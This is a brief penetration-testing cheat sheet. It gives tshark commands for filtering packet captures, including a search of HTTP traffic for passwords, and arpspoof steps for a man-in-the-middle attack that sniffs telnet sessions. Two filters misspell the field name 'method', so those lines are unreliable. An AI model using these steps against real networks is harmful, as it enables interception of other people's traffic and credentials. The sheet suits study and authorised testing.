# Network Based Attacks

### Tshark: command line of wireshark
- run statistics on a pcap: `tshark -r pcapfile.pcap -z io,phs -q`
  
  **Filtering basics**
  - specific traffic, source address and destination`tshark -r pcapfile.pcap -Y 'ip.src==10.10.x.x && ip.dst==10.10.x.x'`
  - GET request: `tshark -r pcapfile.pcap -Y 'http.request.metgod==GET' | more`
  - specific fields: `tshark -r pcapfile.pcap -Y 'http.request.metgod==GET' -Tfields -e frame.time -e ip.src -e http.request.full_uri | more`
  - HTTP contains password: `tshark -r pcapfile.pcap -Y 'http contains password'`
  
  **ARP Poisoning**
  - if you have found telnet: port 23
  - open wireshark
  - `echo 1 > /proc/sys/net/ipv4/ip_forward`
  - `arpspoof -i eth1 -t telnet_ip -r other_ip`
  - search for `telnet` in wireshark